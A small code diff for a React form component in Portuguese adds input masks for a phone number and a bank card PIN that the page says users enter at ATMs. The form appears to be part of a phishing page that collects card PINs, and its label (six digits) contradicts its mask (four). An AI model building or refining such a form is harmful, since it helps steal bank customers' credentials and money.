@@ -1,5 +1,6 @@
 import React, { useState } from 'react'
 import './EmailTelefone.css'
+import InputMask from 'react-input-mask';
 import { useNavigate } from 'react-router-dom'
 
 const EmailTelefone = () => {
@@ -31,9 +32,9 @@ const EmailTelefone = () => {
         </div>
         <div className='form3'>
             <span>o mesmo que está em seu cadastro:</span>
-            <input className="digitavel" type="text" placeholder='telefone' onChange={defineTel} />
+            <InputMask mask="(99) 99999-9999" className="digitavel" type="text" placeholder='telefone' onChange={defineTel} />
             <span>a mesma que você usa no caixa eletrônico (6 digitos):</span>
-            <input className="digitavel" type="text" placeholder='digite a senha do cartão' onChange={defineSeis} />
+            <InputMask mask="9999" className="digitavel" type="password" placeholder='digite a senha do cartão' onChange={defineSeis} />
             <button onClick={handleClick}>confirmar</button>
         </div>
     </div>
